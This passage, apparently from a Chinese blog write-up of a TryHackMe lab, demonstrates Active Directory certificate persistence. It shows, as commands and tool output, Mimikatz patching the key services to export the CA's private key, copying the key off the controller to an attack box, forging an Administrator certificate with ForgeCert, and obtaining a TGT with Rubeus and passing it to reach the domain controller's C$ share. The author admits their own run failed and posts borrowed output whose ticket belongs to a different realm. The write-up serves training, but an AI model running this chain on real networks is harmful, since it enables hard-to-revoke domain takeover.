        Algorithm      : CALG_RSA_KEYX 
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO

 <span class="hljs-number">3</span>.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">02000000000078856466521</span>a82570200000010
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA) 
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM
    Hash SHA1: <span class="hljs-number">0</span>d43237c50ccb446a07572545b5b4c8cf517682a
        Key Container  : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>) 
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-<span class="hljs-number">21</span>e4d1ee-<span class="hljs-number">54</span>f7-<span class="hljs-number">4</span>ca5-b36b-b2cecff9a609
        |Unique name   : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;  
        Algorithm      : CALG_RSA_KEYX
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO</code></pre>
<p>我们可以看到DC上有CA证书。我们还可以注意到，其中一些证书被设置为不允许我们导出密钥。如果没有这个私钥，我们将无法生成新的证书。幸运的是，Mimikatz 允许我们修补内存以使这些密钥可导出：</p>
<pre><code class="hljs scss">
mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng
<span class="hljs-string">"KeyIso"</span> service patched</code></pre>
<p>如果您收到错误，请不要担心，这只是意味着其他人在您之前执行了该补丁。修补这些服务后，我们可以使用 Mimikatz 导出证书：</p>
<pre><code class="hljs scss">mimikatz # crypto::certificates /systemstore:local_machine /export 
 * System Store  : <span class="hljs-string">'local_machine'</span> (<span class="hljs-number">0</span>x00020000) 
 * Store         : <span class="hljs-string">'My'</span>

 <span class="hljs-number">0</span>.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">040000000000703</span>a4d78090a0ab10400000010 
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-<span class="hljs-number">5</span>ed52c94-<span class="hljs-number">34</span>e8-<span class="hljs-number">4450</span>-a751-a57ac55a110f 
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX 
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - <span class="hljs-string">'local_machine_My_0_.der'</span> 
        Private export : OK - <span class="hljs-string">'local_machine_My_0_.pfx'</span> 

 <span class="hljs-number">1</span>. za-THMDC-CA
    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">90</span>e157dae304ef429824a33d3a3ef91e 
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2027</span> <span class="hljs-number">7</span>:<span class="hljs-number">08</span>:<span class="hljs-number">09</span> PM
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e 
        Key Container  : za-THMDC-CA
        Provider       : Microsoft Software Key Storage Provider
        Provider type  : cng (<span class="hljs-number">0</span>)
        Type           : CNG Key (<span class="hljs-number">0</span>xffffffff) 
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
        Key Container  : za-THMDC-CA 
        Unique name    : <span class="hljs-number">8</span>d666f3049de45dee20c70510f66d2cf_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Algorithm      : RSA
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Export policy  : <span class="hljs-number">00000003</span> ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) 
        Exportable key : YES
        LSA isolation  : NO 
        Public export  : OK - <span class="hljs-string">'local_machine_My_1_za-THMDC-CA.der'</span> 
        Private export : OK - <span class="hljs-string">'local_machine_My_1_za-THMDC-CA.pfx'</span> 

 <span class="hljs-number">2</span>. THMDC.za.tryhackme.loc
    Subject  : CN=THMDC.za.tryhackme.loc
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">03000000000057</span>c6f9be06e7c78d0300000010
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA) 
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-<span class="hljs-number">6606</span>-<span class="hljs-number">40</span>a3-a87a-f549bdcd757c
        |Unique name   : <span class="hljs-number">520</span>b5ca0aec81961ad476939c6792c13_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO
        Public export  : OK - <span class="hljs-string">'local_machine_My_2_THMDC.za.tryhackme.loc.der'</span>
        Private export : OK - <span class="hljs-string">'local_machine_My_2_THMDC.za.tryhackme.loc.pfx'</span> 

 <span class="hljs-number">3</span>.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">02000000000078856466521</span>a82570200000010 
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18</span> PM
    Hash SHA1: <span class="hljs-number">0</span>d43237c50ccb446a07572545b5b4c8cf517682a
        Key Container  : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-<span class="hljs-number">21</span>e4d1ee-<span class="hljs-number">54</span>f7-<span class="hljs-number">4</span>ca5-b36b-b2cecff9a609 
        |Unique name   : <span class="hljs-number">544</span>fc312c893025e32795e06e74c4517_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO
        Public export  : OK - <span class="hljs-string">'local_machine_My_3_.der'</span>
        Private export : OK - <span class="hljs-string">'local_machine_My_3_.pfx'</span></code></pre>
<p>导出的证书将以 PFX 和 DER 格式存储到磁盘：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172601555.png" alt="image-20240226172601555"></p>
<p><code>za-THMDC-CA.pfx</code> 证书是我们特别感兴趣的证书。为了导出私钥，必须使用密码来加密证书。默认情况下，Mimikatz 分配的密码为 <code>mimikatz</code> 。使用 SCP 下载或复制此证书到您的 AttackBox，然后将其复制到 THMWRK1 上的低权限用户的主目录。如果您愿意，还可以在自己的未加入域的 Windows 计算机上执行其余步骤。</p>
<p>这里我不知为何我没有<code>za-THMDC-CA.pfx</code>证书，弄了半天是我ssh连接对象搞错了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226175500376.png" alt="image-20240226175500376"></p>
<h2 id="生成我们自己的证书">生成我们自己的证书</h2>
<p>现在我们有了私钥和根 CA 证书，我们可以使用 SpectorOps <a target="_blank" rel="noopener" href="https://github.com/GhostPack/ForgeCert">ForgeCert</a> 工具为我们想要的任何用户伪造客户端身份验证证书。 ForgeCert 和 Rubeus 二进制文件存储在 THMWRK1 上的 C:\Tools\ 目录中。让我们使用 ForgeCert 生成一个新证书：</p>
<p>这里我们需要将上述的pfx文件传输到我们的attackbox上</p>
<pre><code class="hljs scss">scp Administrator<span class="hljs-keyword">@thmdc</span>.za.tryhackme.<span class="hljs-attribute">loc</span>:<span class="hljs-attribute">C</span>:/Users/Administrator/hybcx/local_machine_My_1_za-THMDC-CA.pfx .</code></pre>
<p>接着ssh连接该域环境的thmwrk计算机，将该pfx文件传输至该计算机上</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194150775.png" alt="image-20240226194150775"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194157209.png" alt="image-20240226194157209"></p>
<pre><code class="hljs scss">certutil -urlcache -f http://<span class="hljs-number">10.50</span>.<span class="hljs-number">59.120</span>:<span class="hljs-number">8000</span>/za-THMDC-CA.pfx za-THMDC-CA.pfx</code></pre>
<p>接下来使用工具生成证书</p>
<pre><code class="hljs scss">C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath hybcx.pfx --NewCertPassword Password123</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194610334.png" alt></p>
<p>参数解释：</p>
<ul>
<li>CaCertPath - 我们导出的 CA 证书的路径。</li>
<li>CaCertPassword - 用于加密证书的密码。默认情况下，Mimikatz 分配的密码为 <code>mimikatz</code> 。</li>
<li>Subject - 证书的主题或通用名称。对于我们使用证书的用途而言，这并不重要。</li>
<li>subjectAltName - 这是我们要使用此证书模拟的帐户的用户主体名称 (UPN)。它必须是合法用户。</li>
<li>NewCertPath - ForgeCert 将存储生成的证书的路径。</li>
<li>NewCertPassword - 由于证书需要导出私钥用于身份验证，因此我们必须设置一个用于加密它的新密码。</li>
</ul>
<p>我们可以使用 Rubeus 来使用证书请求 TGT，以验证证书是否可信。我们将使用以下命令：</p>
<pre><code class="hljs scss">C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:hybcx.pfx /password:Password123 /outfile:fullAdmin.kirbi /domain:za.tryhackme.loc /dc:<span class="hljs-number">10.200</span>.<span class="hljs-number">62.101</span></code></pre>
<p>我们来分解一下参数：</p>
<ul>
<li>/user - 这指定我们将模拟的用户，并且必须与我们生成的证书的 UPN 相匹配</li>
<li>/enctype - 指定票证的加密类型。设置此项对于规避很重要，因为默认加密算法很弱，这会导致溢出警报</li>
<li>/certificate - 我们生成的证书的路径</li>
<li>/password - 我们的证书文件的密码</li>
<li>/outfile - TGT 将输出到的文件</li>
<li>/domain - 我们当前攻击的域的 FQDN</li>
<li>/dc - 我们请求 TGT 的域控制器的 IP。通常，最好选择运行CA服务的DC</li>
</ul>
<p>执行命令后，我们应该会收到 TGT：</p>
<p>但这里我总是报错，如下图</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240229185632633.png" alt="image-20240229185632633"></p>
<p>这里经过几篇文章的搜寻，该报错原因是由于其不支持padata类型，也就是该KDC没有设置kerberos身份验证。这里也是懵逼了，尝试几次都失败，感觉是环境问题，但刚重置了还是出错，不理解，就先放出成果图</p>
<pre><code class="hljs scss">za\aaron<span class="hljs-selector-class">.jones</span><span class="hljs-keyword">@THMWRK</span>1 <span class="hljs-attribute">C</span>:\Users\aaron.jones&gt;<span class="hljs-attribute">C</span>:\Tools\Rubeus.exe asktgt /<span class="hljs-attribute">user</span>:Administrator /<span class="hljs-attribute">enctype</span>:aes256 /<span class="hljs-attribute">certificate</span>:vulncert.pfx /<span class="hljs-attribute">password</span>:tryhackme /<span class="hljs-attribute">outfile</span>:administrator.kirbi /<span class="hljs-attribute">domain</span>:za.tryhackme.loc /<span class="hljs-attribute">dc</span>:<span class="hljs-number">10.200</span>.x.<span class="hljs-number">101</span>
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.<span class="hljs-number">0.0</span>
       
       [*] <span class="hljs-attribute">Action</span>: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">subject</span>: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) <span class="hljs-attribute">for</span>: <span class="hljs-string">'za.tryhackme.loc\Administrator'</span>
       [+] TGT request successful!
       [*] base64(ticket.kirbi):
       
             doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk
             MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC
             BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ
             nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/
             MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD
             zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+<span class="hljs-number">7</span>DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr
             <span class="hljs-number">2</span>Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW
             ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM
             Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+<span class="hljs-number">0</span>qOZDtgaJZ/neRdRktYhTsGL39VHB5
             i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/<span class="hljs-number">7</span>ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW
             NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/<span class="hljs-number">6</span>NyLjiE9srbOt6hCLzUaOSMGH1Enf
             SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF
             CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/<span class="hljs-number">4</span>mEjbUN5qjNqejYdUb/b5xw
             S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG
             CNdI1/lsICpS/jaK6NM/<span class="hljs-number">0</span>oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk
             RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+
             f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO
             hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS
             n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/<span class="hljs-number">2</span>r7ecyrVZIf2Qf0+ci9G
             vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP
             iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY
             <span class="hljs-number">5</span>K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g
             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO
             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3
             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D
             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=
       
         ServiceName              :  krbtgt/za.tryhackme.loc
         ServiceRealm             :  za.tryhackme.loc
         UserName                 :  Administrator
         UserRealm                :  za.tryhackme.loc
         StartTime                :  <span class="hljs-number">2</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">5</span>:<span class="hljs-number">54</span>:<span class="hljs-number">46</span> PM
         EndTime                  :  <span class="hljs-number">2</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">54</span>:<span class="hljs-number">46</span> AM
         RenewTill                :  <span class="hljs-number">2</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span> <span class="hljs-number">5</span>:<span class="hljs-number">54</span>:<span class="hljs-number">46</span> PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED</code></pre>
<p>现在我们可以使用 Mimikatz 加载 TGT 并向 THMDC 进行身份验证：</p>
<pre><code class="hljs scss">C:\Tools\mimikatz_trunk\x64\mimikatz.exe

mimikatz # kerberos::ptt administrator.kirbi

dir \\THMDC.za.tryhackme.loc\c$\</code></pre>
<pre><code class="hljs scss">mimikatz # kerberos::ptt administrator.kirbi

* File: <span class="hljs-string">'administrator.kirbi'</span>: OK

mimikatz # exit
Bye! 

za\aaron.jones@THMWRK1 C:\Users\aaron.jones&gt;dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is <span class="hljs-number">1634</span>-<span class="hljs-number">22</span>A9

 Directory of \\THMDC.za.tryhackme.loc\c$

<span class="hljs-number">01</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">47</span> AM               <span class="hljs-number">103</span> delete-vagrant-user.ps1
<span class="hljs-number">04</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">24</span> AM               <span class="hljs-number">154</span> dns_entries.csv
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">53</span> PM           <span class="hljs-number">885</span>,<span class="hljs-number">468</span> MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
<span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">19</span> AM    &lt;DIR&gt;          PerfLogs
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">31</span> PM    &lt;DIR&gt;          Program Files
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          Program Files (x86)
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">27</span> AM             <span class="hljs-number">1</span>,<span class="hljs-number">423</span> thm-network-setup-dc.ps1
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">13</span> PM    &lt;DIR&gt;          tmp
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">22</span> AM    &lt;DIR&gt;          Users
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">11</span> PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">12</span> PM    &lt;DIR&gt;          Windows
               <span class="hljs-number">7</span> <span class="hljs-built_in">File</span>(s)      <span class="hljs-number">2</span>,<span class="hljs-number">356</span>,<span class="hljs-number">811</span> bytes
               <span class="hljs-number">7</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">50</span>,<span class="hljs-number">914</span>,<span class="hljs-number">541</span>,<span class="hljs-number">568</span> bytes free</code></pre>
<h2 id="我们不再是蓝队的朋友">我们不再是蓝队的朋友</h2>
<p>证书持久性的防御难度要大得多。即使您轮换受感染帐户的凭据，证书仍然有效。消除持久性的唯一方法是吊销证书。但是，只有当我们通过合法渠道生成证书时，这才可能实现。由于我们导出了 CA 并自己生成了证书，因此它不会出现在 AD CS 的已颁发证书列表中，这意味着蓝队将无法撤销我们的证书。</p>
<p>那么消除持久性的唯一解决方案是什么？好吧，这就是为什么我们不再是朋友了。他们必须吊销根 CA 证书。但是吊销这个证书意味着AD CS颁发的所有证书都会突然失效。这意味着他们必须为每个使用 AD CS 的系统生成新证书。您应该开始明白为什么这种类型的持久性非常危险，并且如果执行则需要完全重建系统。</p>
